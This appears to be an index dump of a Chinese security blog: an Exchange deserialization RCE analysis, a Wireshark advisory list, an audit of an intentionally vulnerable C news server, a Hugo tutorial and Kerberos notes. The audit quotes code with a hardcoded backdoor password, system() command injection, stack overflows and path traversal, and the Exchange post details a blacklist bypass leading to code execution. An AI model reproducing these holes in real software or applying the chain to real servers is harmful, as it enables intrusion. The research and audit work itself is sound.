psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } 而后调用PSMemberInfoIntegratingCollection构造函数，其中PSMemberInfoIntegratingCollection类继承了PSMemberInfo类。传入构造函数的collections变量来源于PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable) 函数的返回值，构造函数将collections赋给当前对象的collections属性。\ninternal class PSMemberInfoIntegratingCollection\u0026lt;T\u0026gt; : PSMemberInfoCollection\u0026lt;T\u0026gt;, IEnumerable\u0026lt;T\u0026gt;, IEnumerable where T : PSMemberInfo { // Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4 private void GenerateAllReservedMembers() { if (!this.mshOwner.hasGeneratedReservedMembers) { this.mshOwner.hasGeneratedReservedMembers = true; ReservedNameMembers.GeneratePSExtendedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSBaseMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSObjectMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSAdaptedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSTypeNames(this.mshOwner); } } internal PSMemberInfoIntegratingCollection(object owner, Collection\u0026lt;CollectionEntry\u0026lt;T\u0026gt;\u0026gt; collections) { if (owner == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;owner\u0026#34;); } this.mshOwner = (owner as PSObject); this.memberSetOwner = (owner as PSMemberSet); if (this.mshOwner == null \u0026amp;\u0026amp; this.memberSetOwner == null) { throw PSTraceSource.NewArgumentException(\u0026#34;owner\u0026#34;); } if (collections == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;collections\u0026#34;); } this.collections = collections; } GetMemberCollection代码如下，其会将对象的adaptedMembers属性添加到列表中，而在内层对象反序列化时已经将名为TargetTypeForDeserialization的XamlReader类型的Type对象加入到adaptedMembers属性中。所以返回的列表内也会包含该对象。\ninternal static Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable) { Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; collection = new Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt;(); if ((viewType \u0026amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended) { if (backupTypeTable == null) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), true, true, \u0026#34;type table members\u0026#34;)); } else { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;((PSObject msjObj) =\u0026gt; PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable), (PSObject msjObj, string name) =\u0026gt; PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable, name), true, true, \u0026#34;type table members\u0026#34;)); } } if ((viewType \u0026amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted) { **collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;adapted members\u0026#34;));** } if ((viewType \u0026amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;clr members\u0026#34;)); } return collection; } private static T AdapterGetMemberDelegate\u0026lt;T\u0026gt;(PSObject msjObj, string name) where T : PSMemberInfo { if (!msjObj.isDeserialized) { T t = msjObj.InternalAdapter.BaseGetMember\u0026lt;T\u0026gt;(msjObj.immediateBaseObject, name); PSObject.memberResolution.WriteLine(\u0026#34;Adapted member: {0}.\u0026#34;, (t == null) ? \u0026#34;not found\u0026#34; : t.Name); return t; } if (msjObj.adaptedMembers == null) { return default(T); } T t2 = msjObj.adaptedMembers[name] as T; PSObject.memberResolution.WriteLine(\u0026#34;Serialized adapted member: {0}.\u0026#34;, (t2 == null) ? \u0026#34;not found\u0026#34; : t2.Name); return t2; } 返回到GetPSStandardMember函数中，Exchange会匹配构造函数返回的对象的memberName属性，该属性来源于GetTargetTypeForDeserialization调用时传递的硬编码TargetTypeForDeserialization，即将从该对象中检索名为TargetTypeForDeserialization的值，前面提到过列表内已有该名字的对象，所以将匹配到XamlReader类型的Type对象，并返回给上层函数。\n返回到上层函数，GetTargetTypeForDeserialization返回了XamlReader类型。\n进入到ConvertTo函数内，valueToConvert为上层函数ReadOneObject函数传入的obj对象，其内包含了xaml反序列化的命令执行字符串。\n进入到LanguagePrimitives.FigureConversion在#3527处断点，此时fromType为String，toType为XamlReader\n进入FigureParseConversion内，将会通过反射获取到XamlReader的Parse方法。\nprivate static LanguagePrimitives.PSConverter\u0026lt;object\u0026gt; FigureParseConversion(Type fromType, Type toType) { ..... else if (fromType == typeof(string)) { MethodInfo methodInfo = null; try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string), typeof(IFormatProvider) }, null); } catch (AmbiguousMatchException ex) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex.Message); } catch (ArgumentException ex2) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex2.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithCulture); } try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string) }, null); } catch (AmbiguousMatchException ex3) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex3.Message); } catch (ArgumentException ex4) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex4.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithoutCulture); } } return null; } XamlReader.Parse方法将会由LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCulture方法调用。之后就是普通的反序列化过程了。\n小结 这个漏洞利用链核心是如何绕过Exchange黑名单类并使Exchange将攻击者控制的指定数据反序列化到指定危险类造成代码执行。\n漏洞利用了Exchange的合法功能，先构造了名为targetTypeForDeserialization 的XamlReader类型的Type对象序列化值，利用Microsoft.Exchange.Data.SerializationTypeConverter的特性返回了XamlReader类型的Type对象，而后ReadProperties将其加入到adaptedMember内。在外层对象反序列化时，构造的PSMembers包含了名为targetTypeForDeserialization的XamlReader类型的Type对象，Exchange会在PSMembers列表内匹配targetTypeForDeserialization项，从而控制了ConvertTo函数转化的目标类XamlReader，Exchange通过反射获取到了XamlReader的Parse方法，调用该方法反序列化攻击者可控的序列化数据，触发代码执行。\n在调试过程中需要将.NET Framework的优化关掉以便dnSpy调试\n[.NET Framework Debugging Control] GenerateTrackingInfo=1 AllowOptimize=0 COMPlus_ZapDisable=1 COMPlus_ReadyToRun=0 其他\nPSRP：PowerShell Remote Protocol powerShell远程协议，是微软提供的通过SOAP协议上执行PowerShell代码的协议\n参考资料\nhttps://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend\nhttps://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell\nCreated at 2023-05-05T20:35:49+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/wireshark-185/","title":"Wireshark 1.8.5代码审计","tags":[],"description":"","content":"通过爬取wireshark的漏洞公告页面，筛选1.8.6修复的漏洞可以得到如下结果：\n1.8.6/1.8.7修复的漏洞\nwnpa-sec-2013-31. ETCH dissector large loop. Fixed in 1.8.7.\nThe ETCH dissector could go into a large loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-30. MySQL dissector infinite loop. Fixed in 1.8.7.\nThe MySQL dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-29. Websocket dissector crash. Fixed in 1.8.7.\nThe Websocket dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-28. MPEG DSM-CC dissector crash. Fixed in 1.8.7.\nThe MPEG DSM-CC dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-27. DCP ETSI dissector crash. Fixed in 1.8.7.\nThe DCP ETSI dissector could crash. Discovered by Evan Jensen.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-26. PPP CCP dissector crash. Fixed in 1.8.7.\nThe PPP CCP dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-25. ASN.1 BER dissector crash. Fixed in 1.8.7, 1.6.15.\nThe ASN.1 BER dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-24. GTPv2 dissector crash. Fixed in 1.8.7.\nThe GTPv2 dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-23. RELOAD dissector infinite loop. Fixed in 1.8.7.\nThe RELOAD dissector could go into an infinite loop. Discovered by Evan Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-22. DTLS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe DTLS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-21. RELOAD dissector infinite loop. Fixed in 1.8.6.\nThe RELOAD dissector could go into an infinite loop. Discovered by Even Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-20. FCSP dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe FCSP dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-19. CIMD dissector crash. Fixed in 1.8.6, 1.6.14.\nThe CIMD dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-18. ACN dissector divide by zero. Fixed in 1.8.6, 1.6.14.\nThe ACN dissector could attempt to divide by zero. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-17. AMPQ dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe AMPQ dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-16. Mount dissector crash. Fixed in 1.8.6, 1.6.14.\nThe Mount dissector could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-15. RTPS and RTPS2 dissector crash. Fixed in 1.8.6, 1.6.14.\nThe RTPS and RTPS2 dissectors could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-14. MPLS Echo dissector infinite loop. Fixed in 1.8.6.\nThe MPLS Echo dissector could go into an infinite loop. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-13. MS-MMS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe MS-MMS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-12. CSN.1 dissector crash. Fixed in 1.8.6.\nThe CSN.1 dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-11. HART/IP dissector infinite loop. Fixed in 1.8.6.\nThe HART/IP dissectory could go into an infinite loop.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-10. TCP dissector crash. Fixed in 1.8.6.\nThe TCP dissector could crashIt may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nCreated att 2022-09-08T18:13:59+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/news-server/","title":"News Server审计","tags":[],"description":"","content":"代码地址\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_install.sh\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_server.c\nhttps://trailofbits.github.io/ctf/vulnerabilities/source.html\n编译：gcc -m32 -g -o news_server news_server.c\n目标：找出10个bug和漏洞\nnews_server默认工作在根目录，没有通过chdir切换工作目录（不知道算不算bug）\n修复：\nvoid handleConnection(FILE *logfile, int sock) { chdir(\u0026#34;/root/code/c/news_server/\u0026#34;); 在authenticate函数存在admin后门\nif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } authenticate 中直接拼接用户输入到命令，命令注入\nint authenticate(FILE *logfile, char *user, char *pass) { char search[512]; char path[1024]; char userfile[1024]; char data[1024]; FILE *file; int ret; memset(path, 0, sizeof(1024)); /* FIXME: hard coded admin backdoor for password recovery */\tif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } /* look up user by checking user files: done via system() to /bin/ls|grep user */ logData(logfile, \u0026#34;performing lookup for user via system()!\\n\u0026#34;); snprintf(userfile, sizeof(userfile)-1, \u0026#34;%s.txt\u0026#34;, user); snprintf(search, sizeof(userfile)-1, \u0026#34;stat %s`ls %s | grep %s`\u0026#34;, USERPATH, USERPATH, userfile); ret = system(search); 栈溢出、任意文件读（目录穿越）\nvoid readArticle(int sock, FILE *logfile, char *action) { FILE *file; char buf[100]; char path[100]; logData(logfile, \u0026amp;action[1]); strcpy(path, ARTICLEPATH); strcat(path, \u0026amp;action[1]); logData(logfile, \u0026#34;user request to read article: %s\u0026#34;, path); file = fopen(path, \u0026#34;r\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } /* fgets for the size of the buffer (100), from the file writing the article to the user each time! */ while (fgets(buf, 1000, file)) 文件写（目录穿越）、栈溢出11字节\nvoid writeArticle(int sock, FILE *logfile, char *action) { FILE *file;\tchar *p; size_t x, y; int complete = 0; char buf[1024]; char path[1024]; strcpy(path, ARTICLEPATH); strncat(path, \u0026amp;action[1], sizeof(path)); logData(logfile, \u0026#34;user writing article: %s\u0026#34;, path); file = fopen(\u0026amp;action[1], \u0026#34;w\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } writeSock(sock, BEGINFILE, sizeof(BEGINFILE)); "},{"uri":"https://www.ch35tnut.site/zh-cn/others/add-timeline-shortcode/","title":"给hugo-theme-learn增加timeline功能","tags":[],"description":"","content":"前言 现在使用hugo-theme-learn主题，但这个主题没有提供时间线功能，为了给首页增加时间线功能，花了两天研究了一下怎么添加时间线功能。\n为了方便增加时间线的事件，采用自定义shortcode的方式增加时间线，代码大部分参考引用链接里面的，魔改了一下以适应自己的主题，增加了过去多少天的显示。\n代码实现 在layout/shortcodes新增文件：event.html和timeline.html，内容分别如下\nevent.html {{$duration := \u0026#34;\u0026#34;}} {{$to := now }} {{ if ne (.Get \u0026#34;to\u0026#34;) \u0026#34;\u0026#34;}} {{$to = time (.Get \u0026#34;to\u0026#34;) }} {{end}} {{$enabledTime := ne (.Get \u0026#34;from\u0026#34;) \u0026#34;\u0026#34;}} {{if $enabledTime }} {{$from := time (.Get \u0026#34;from\u0026#34;) }} {{ $diff := $to.Sub $from }} {{ $days := div $diff.Hours 24 | math.Round }} {{$tmonths:=mul ($to.Sub $from).Hours 0.00136986301 }} {{$months := mod $tmonths 12 }} {{$years := math.Floor (div $tmonths 12)}} {{$yearStr := \u0026#34;years\u0026#34;}} {{if lt $years 2 }} {{$yearStr = \u0026#34;year\u0026#34;}} {{end}} {{$monthStr := \u0026#34;months\u0026#34;}} {{if lt $months 2 }} {{$monthStr = \u0026#34;month\u0026#34;}} {{end}} {{$daysStr := \u0026#34;days\u0026#34;}} {{ $idays :=int $days }} {{$duration = \u0026#34;\u0026#34;}} {{if gt $years 0 }} {{$duration = printf \u0026#34;%s %.0f %s\u0026#34; $duration $years $yearStr}} {{$idays = sub $idays (mul 365 $years)}} {{end}} {{if gt $months 0 }} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $months $monthStr}} {{$idays = sub $idays (mul 30 $months)}} {{end}} {{$idays = int $idays}} {{if gt $idays 0}} {{if lt $idays 2}} {{$daysStr = \u0026#34;day\u0026#34;}} {{end}} {{$duration = printf \u0026#34;%s %d %s\u0026#34; $duration $idays $daysStr}} {{end}} {{end}} {{ $from := .Get \u0026#34;from\u0026#34; | time }} {{ $to := now }} {{ $diff := $to.Sub $from }} {{ $ago := div $diff.Hours 24 | math.Round }} {{ $measure := cond (eq 1 $ago) \u0026#34;day\u0026#34; \u0026#34;days\u0026#34; }} {{ $seed := \u0026#34;foo\u0026#34; }} {{ $random := delimit (shuffle (split (md5 $seed) \u0026#34;\u0026#34; )) \u0026#34;\u0026#34; }} \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;title\u0026#34;\u0026gt;{{.Get \u0026#34;title\u0026#34;}}\u0026lt;/div\u0026gt; {{if $enabledTime }} \u0026lt;div class=\u0026#34;moment\u0026#34; {{ if eq .Ordinal 0 }} id=\u0026#34;moment\u0026#34; {{ end }} {{ if ne .Ordinal 0 }}id=\u0026#34;moment-{{ substr $random 0 16}}\u0026#34;{{end}}\u0026gt; {{ if ne .Ordinal 0 }} {{$duration}} {{ end }} | {{ $ago }} {{ $measure}} ago \u0026lt;/div\u0026gt; {{ end }} \u0026lt;div class=\u0026#34;body\u0026#34;\u0026gt; {{.Inner}} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;date\u0026#34;\u0026gt;{{$to.Year}}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {{ if and (eq (.Ordinal) 0) $enabledTime }} \u0026lt;script\u0026gt; function non0plural(number, name) { if (number == 0) { return \u0026#34;\u0026#34; } if (number \u0026gt; 1) { return number + \u0026#34; \u0026#34; + name + \u0026#34;s\u0026#34; } return number + \u0026#34; \u0026#34; + name } function refresh() { start = dayjs({{.Get \u0026#34;from\u0026#34;}}) now = dayjs() total_days = now.diff(start,\u0026#34;d\u0026#34;,true) total_months = now.diff(start, \u0026#34;M\u0026#34;, true) months = total_months % 12 years = Math.floor((total_months) / 12) // for (var i = 0, els = document.querySelectorAll(`[id^=\u0026#34;moment\u0026#34;]`); i \u0026lt; els.length; i++) { // els[i].innerHTML = non0plural(years, \u0026#34;year\u0026#34;) + \u0026#34; \u0026#34; + non0plural(months.toFixed(8), \u0026#34;month\u0026#34;) // } // 如果月份大于1则 if(years\u0026gt;=1){ total_days-=365*years } if(months\u0026gt;=1){ total_days-=30*months } el = document.querySelector(\u0026#34;#moment\u0026#34;); el.innerHTML = years\u0026gt;1? non0plural(years, \u0026#34;year\u0026#34;):\u0026#34;\u0026#34; + \u0026#34; \u0026#34; + months\u0026gt;1? non0plural(months.toFixed(4), \u0026#34;month\u0026#34;):\u0026#34;\u0026#34; + total_days\u0026gt;=1?non0plural(total_days.toFixed(2),\u0026#34;day\u0026#34;):\u0026#34;\u0026#34; el.innerHTML = el.innerHTML + \u0026#34; ago\u0026#34; } window.setInterval(refresh, 100); \u0026lt;/script\u0026gt; {{ end }} timeline.html \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; .timeline { position: relative; margin: 0 auto; } /* The actual timeline (the vertical ruler) */ .timeline::after { content: \u0026#34;\u0026#34;; position: absolute; width: 6px; background-color: #444; top: 0; bottom: 0; left: 10%; margin-left: -3px; } /* Container around content */ .timeline .container { padding: 10px 10px 10px 40px; margin-top: 10px; position: relative; /* background-color: gray; */ width: 90%; left: 10%; } /* The circles on the timeline */ .timeline .container::after { content: \u0026#34;\u0026#34;; position: absolute; width: 25px; height: 25px; left: -12px; background-color: rgb(106, 215, 229); border: 4px solid #444; top: 0px; border-radius: 50%; z-index: 1; } /* date display */ .timeline .container .date { position: absolute; top: 0px; z-index: 1; left: -15%; font-size: large; } /* Add arrows to the right container (pointing left) */ .timeline .container::before { content: \u0026#34; \u0026#34;; height: 0; position: absolute; top: 30px; width: 0; z-index: 1; left: 26px; border: medium solid #6ad7e5; border-width: 13px 13px 13px 0px; border-color: #6ad7e5 #6ad7e5 transparent transparent; } /* The actual content */ .timeline .content { box-shadow: 0 0 3px 3px #6ad7e5; background-color: white; position: relative; border-radius: 6px; transition: box-shadow 0.3s; } /* small shadow change on hover*/ .timeline .content:hover { box-shadow: 0 0 3px 4px #6ad7e5; } /* card title format */ .timeline .content .title { padding: 5px 30px; font-weight: bold; display: inline-block; } /* time moment format*/ .timeline .content .moment { color: #c41a16; text-align: right; position: absolute; top: 0; right: 0; padding: 5px; } /* body size */ .timeline .content .body { padding: 5px 30px; word-wrap: break-word; /* height: 73px; */ /* max-height: 120px; */ text-overflow: ellipsis; overflow: hidden; } /* responsive for small devices*/ @media screen and (max-width: 600px) { .timeline .container { padding: 10px 10px 0px 40px; left: 5%; width: 95%; } .timeline .container .date { font-size: small; transform: rotate(-90deg); left: -5%; top: 30px; } .timeline .container::after { left: 3px; } .timeline .content .body { padding: 5px 5px; } .timeline .content .moment { position: relative; } } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;timeline\u0026#34;\u0026gt; {{ .Inner }} \u0026lt;/div\u0026gt; 由于event.html里面引用了dayjs，这个js不在当前主题内，可以在config.toml新增custom_js = [\u0026quot;js/dayjs.min.js\u0026quot;]，然后把dayjs.min.js放在theme\\hugo-theme-learn\\static\\js目录内，即可解决导入dayjs的问题。\n此时可以在需要添加时间线的地方使用timeline的shortcode添加，以下是我博客首页的时间线代码：\n{{\u0026lt; timeline \u0026gt;}} {{% event title=\u0026#34;09-03至09-04\u0026#34; from=\u0026#34;2022-09-03\u0026#34; to=\u0026#34;2022-09-04\u0026#34; %}} 这两天，给hugo主题增加了timeline的shortcode，见[增加timeline功能](others/add-timeline-shortcode) {{% /event %}} {{% event title=\u0026#34;08-29至09-02\u0026#34; from=\u0026#34;2022-08-29\u0026#34; to=\u0026#34;2022-09-02\u0026#34; %}} 周内审计了代码 {{% /event %}} {{\u0026lt; /timeline \u0026gt;}} 除了这个还顺便给博客新增了基于Github issue的评论功能，参考\rutteranc。\n参考\nhttps://metalblueberry.github.io/post/howto/2021-02-28_hugo_timeline_shortcode/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/about/","title":"关于我","tags":[],"description":"","content":"关于我 21年毕业，目前在某安全厂商工作，主要研究二进制。\n希望可以持之以恒做安全研究。\n黑客精神：Open, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/","title":"认证原理","tags":[],"description":"","content":"认证原理 一、Kerberos概念 Kerberos是计算机网络授权协议，用于在非安全网络中，对个人通信过程中用安全的手段进行身份认证。其中客户端和服务端能够相互认证，识别对方身份。Kerberos是第三方认证，依赖于第三方服务器对彼此进行身份验证，Kerberos服务器本身成为KDC。 由三部分组成：\nKerberos知道用户和集群内服务以及各自的密码数据库 AS验证用户身份，验证通过就会返回给Client端一个TGT Client通过TGT向TGS获取ST 服务验证ST有效性，如果有效则Client可以访问服务 二、Kerberos名词解释 AS（Authentication Server）认证服务器 KDC（Key Distribution Center）密钥分发中心 TGT（Ticket Granting Ticket）票据授权票据，给票据授权的票据 TGS（Ticket Granting Service）票据授权服务 SS（Service Server）服务提供服务器 ST（Server Ticket）服务端票据 一般KDC同时包含AS和TGS\n三、Kerberos验证过程 Client登录，用户输入用户名和密码，会用单向函数根据密码生成客户端密钥（Client Secret Key）\nClient向AS发送A消息请求TGT\nA消息内容 用户名 请求服务名称，这里是TGS 网络地址 请求TGT的生命周期 该消息不会加密，也不会发送密码或者密码生成的密钥 AS检查用户名是否存在AS用户名数据库内，并使用数据库中用户密码生成的NTLM哈希解密客户端消息\n如果数据库内有该用户名则随机生成TGS会话密钥（TGS Session Key），同时给Client端发送两条消息\nB消息内容用客户端密钥加密 TGS名称 时间戳 生命周期 TGS会话密钥（TGS Session Key） C消息内容（TGT）用TGS密钥（TGS Secret Key）加密 用户名 TGS名称 时间戳 用户网络地址 生命周期 TGS会话密钥（TGS Session Key） Client用通过密码生成的客户端密钥解密B消息，如果密码正确则可以得到TGS会话密钥（TGS Session Key），将C消息（TGT）存储在本地凭据缓存内。\nClient向TGS请求ST，期间需要向TGS发送两条消息明文\nD消息内容 想要请求的服务ID即SS 生命周期 TGT E消息内容使用TGS会话密钥（TGS Session Key）加密即身份验证器 用户名 时间戳 TGS验证Client请求服务是否存在，存在则进入下一步。\nTGS提取D消息内的TGT，用TGS密钥解密（TGS Secret Key），从中提取TGS会话密钥（TGS Session Key），再用TGS会话密钥解密E得到用户名和时间戳，现在TGS得到了用户名和消息E的时间戳，以及消息C的用户名和时间戳\n比较两个用户名和时间戳 检查TGT生命周期是否过期 检查身份验证器（E消息）是否在缓存内(存疑) TGS生成随机服务会话（service session key）密钥，并发送两条消息给Client\nF消息内容用服务密钥(Service Secret Key)加密 用户名 服务名 时间戳 网络地址 生命周期 服务会话密钥 G消息内容用TGS会话密钥加密 服务名 时间戳 生命周期 服务会话密钥 因为Client有TGS会话密钥所以可以解密消息G得到服务会话密钥（service session key）\n客户端和SS连接，发送两条消息\n消息H用服务会话密钥加密内容身份验证器： 用户名 时间戳 消息L 即消息F SS收到请求，用服务密钥解密消息I即消息F得到服务会话密钥及用户名时间戳等信息，再用服务会话密钥解密消息H得到用户名和时间戳\nSS进行身份验证\n比较消息H内用户名和消息F内的用户名 比较消息H和消息F内的是时间戳 检查消息F内生命周期 检查身份验证器是否在缓存内 SS向Client验证身份，向其发送消息\n消息J使用服务会话密钥加密身份验证器 服务ID 时间戳（在消息H内的时间戳） 客户端收到SS的身份验证器消息（J），使用缓存内的服务会话密钥进行解密得到服务ID及时间戳，并验证是否有效\n参考链接\nhttps://www.vanimpe.eu/2017/05/26/kerberos-made-easy/ https://zh.wikipedia.org/wiki/Kerberos http://www.nosqlnotes.com/technotes/kerberos-protocol/ https://juejin.im/post/6844903955416219661\n简化模型 Client向AS发送明文消息，申请访问的服务 AS检查用户名是否存在本地数据库中，存在则返回两条消息 A：Client/TGS会话密钥(Client/TGS Session Key)用于Client和TGS通信，通过用户密钥加密 B：TGT（包含Client/TGS会话密钥、用户、用户网络地址、TGT有效期），通过TGS密钥加密 Client收到消息AB，用自己的用户密钥解密消息A得到和TGS通信的密钥TGS会话密钥 